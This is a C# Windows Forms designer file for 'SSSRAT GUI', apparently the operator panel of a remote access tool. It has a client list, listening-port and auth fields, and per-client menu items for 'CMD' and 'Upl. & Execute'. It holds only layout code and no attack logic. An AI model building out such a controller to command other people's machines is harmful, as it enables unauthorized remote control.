using System.Windows.Forms;

namespace SSSRAT_GUI {
	partial class FrmMain {
		/// <summary>
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.IContainer components = null;

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		protected override void Dispose(bool disposing) {
			if (disposing && (components != null)) {
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		#region Windows Form Designer generated code

		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent() {
			this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
			this.list_clients = new System.Windows.Forms.ListView();
			this.menuStrip1 = new System.Windows.Forms.MenuStrip();
			this.t_port = new System.Windows.Forms.ToolStripTextBox();
			this.t_kaPort = new System.Windows.Forms.ToolStripTextBox();
			this.t_auth = new System.Windows.Forms.ToolStripTextBox();
			this.b_startListening = new System.Windows.Forms.ToolStripButton();
			this.b_stopListening = new System.Windows.Forms.ToolStripButton();
			this.l_listeningOn = new System.Windows.Forms.ToolStripMenuItem();
			this.menu_client = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.l_menu_id = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
			this.cMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uplExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.infoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.menuStrip1.SuspendLayout();
			this.menu_client.SuspendLayout();
			this.SuspendLayout();
			// 
			// list_clients
			// 
			this.list_clients.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
			this.list_clients.Location = new System.Drawing.Point(12, 30);
			this.list_clients.Name = "list_clients";
			this.list_clients.Size = new System.Drawing.Size(575, 245);
			this.list_clients.TabIndex = 0;
			this.list_clients.UseCompatibleStateImageBehavior = false;
			this.list_clients.View = System.Windows.Forms.View.List;
			this.list_clients.MouseClick += new System.Windows.Forms.MouseEventHandler(this.ListClientsMouseClick);
			// 
			// menuStrip1
			// 
			this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.t_port,
            this.t_kaPort,
            this.t_auth,
            this.b_startListening,
            this.b_stopListening,
            this.l_listeningOn});
			this.menuStrip1.Location = new System.Drawing.Point(0, 0);
			this.menuStrip1.Name = "menuStrip1";
			this.menuStrip1.Size = new System.Drawing.Size(599, 27);
			this.menuStrip1.TabIndex = 2;
			this.menuStrip1.Text = "menuStrip1";
			// 
			// t_port
			// 
			this.t_port.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(186)));
			this.t_port.ForeColor = System.Drawing.Color.Gray;
			this.t_port.MaxLength = 5;
			this.t_port.Name = "t_port";
			this.t_port.Size = new System.Drawing.Size(100, 23);
			this.t_port.Text = "Command port";
			this.t_port.Enter += new System.EventHandler(this.TPortEnter);
			this.t_port.Leave += new System.EventHandler(this.TPortLeave);
			// 
			// t_kaPort
			// 
			this.t_kaPort.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(186)));
			this.t_kaPort.ForeColor = System.Drawing.Color.Gray;
			this.t_kaPort.Name = "t_kaPort";
			this.t_kaPort.Size = new System.Drawing.Size(100, 23);
			this.t_kaPort.Text = "Keep-alive port";
			this.t_kaPort.Enter += new System.EventHandler(this.TKaPortEnter);
			this.t_kaPort.Leave += new System.EventHandler(this.TKaPortLeave);
			// 
			// t_auth
			// 
			this.t_auth.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(186)));
			this.t_auth.ForeColor = System.Drawing.Color.Gray;
			this.t_auth.Name = "t_auth";
			this.t_auth.Size = new System.Drawing.Size(100, 23);
			this.t_auth.Text = "Auth";
			this.t_auth.Enter += new System.EventHandler(this.TAuthEnter);
			this.t_auth.Leave += new System.EventHandler(this.TAuthLeave);
			// 
			// b_startListening
			// 
			this.b_startListening.Name = "b_startListening";
			this.b_startListening.Size = new System.Drawing.Size(83, 20);
			this.b_startListening.Text = "Start listening";
			this.b_startListening.Click += new System.EventHandler(this.BStartListeningClick);
			// 
			// b_stopListening
			// 
			this.b_stopListening.Name = "b_stopListening";
			this.b_stopListening.Size = new System.Drawing.Size(83, 20);
			this.b_stopListening.Text = "Stop listening";
			this.b_stopListening.Click += new System.EventHandler(this.BStopListeningClick);
			// 
			// l_listeningOn
			// 
			this.l_listeningOn.ForeColor = System.Drawing.Color.Red;
			this.l_listeningOn.Name = "l_listeningOn";
			this.l_listeningOn.Size = new System.Drawing.Size(112, 23);
			this.l_listeningOn.Text = "Listening on: N/A";
			// 
			// menu_client
			// 
			this.menu_client.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.l_menu_id,
            this.toolStripSeparator1,
            this.cMDToolStripMenuItem,
            this.uplExecuteToolStripMenuItem,
            this.infoToolStripMenuItem});
			this.menu_client.Name = "menu_client";
			this.menu_client.Size = new System.Drawing.Size(152, 98);
			// 
			// l_menu_id
			// 
			this.l_menu_id.Name = "l_menu_id";
			this.l_menu_id.Size = new System.Drawing.Size(151, 22);
			this.l_menu_id.Text = "ID: N/A";
			// 
			// toolStripSeparator1
			// 
			this.toolStripSeparator1.Name = "toolStripSeparator1";
			this.toolStripSeparator1.Size = new System.Drawing.Size(148, 6);
			// 
			// cMDToolStripMenuItem
			// 
			this.cMDToolStripMenuItem.Name = "cMDToolStripMenuItem";
			this.cMDToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
			this.cMDToolStripMenuItem.Text = "CMD";
			this.cMDToolStripMenuItem.Click += new System.EventHandler(this.CMDToolStripMenuItemClick);
			// 
			// uplExecuteToolStripMenuItem
			// 
			this.uplExecuteToolStripMenuItem.Name = "uplExecuteToolStripMenuItem";
			this.uplExecuteToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
			this.uplExecuteToolStripMenuItem.Text = "Upl. && Execute";
			// 
			// infoToolStripMenuItem
			// 
			this.infoToolStripMenuItem.Name = "infoToolStripMenuItem";
			this.infoToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
			this.infoToolStripMenuItem.Text = "Info";
			// 
			// FrmMain
			// 
			this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.ClientSize = new System.Drawing.Size(599, 287);
			this.Controls.Add(this.menuStrip1);
			this.Controls.Add(this.list_clients);
			this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
			this.MainMenuStrip = this.menuStrip1;
			this.Name = "FrmMain";
			this.Text = "SSSRAT GUI";
			this.menuStrip1.ResumeLayout(false);
			this.menuStrip1.PerformLayout();
			this.menu_client.ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();

		}

		#endregion

		private System.Windows.Forms.ListView list_clients;
		private System.Windows.Forms.MenuStrip menuStrip1;
		private System.Windows.Forms.ToolStripTextBox t_port;
		private System.Windows.Forms.ToolStripTextBox t_kaPort;
		private System.Windows.Forms.ToolStripTextBox t_auth;
		private System.Windows.Forms.ToolStripButton b_startListening;
		private System.Windows.Forms.ToolStripButton b_stopListening;
		private ToolStripMenuItem l_listeningOn;
		private ContextMenuStrip menu_client;
		private ToolStripMenuItem cMDToolStripMenuItem;
		private ToolStripMenuItem uplExecuteToolStripMenuItem;
		private ToolStripMenuItem infoToolStripMenuItem;
		private ToolStripMenuItem l_menu_id;
		private ToolStripSeparator toolStripSeparator1;
	}
}

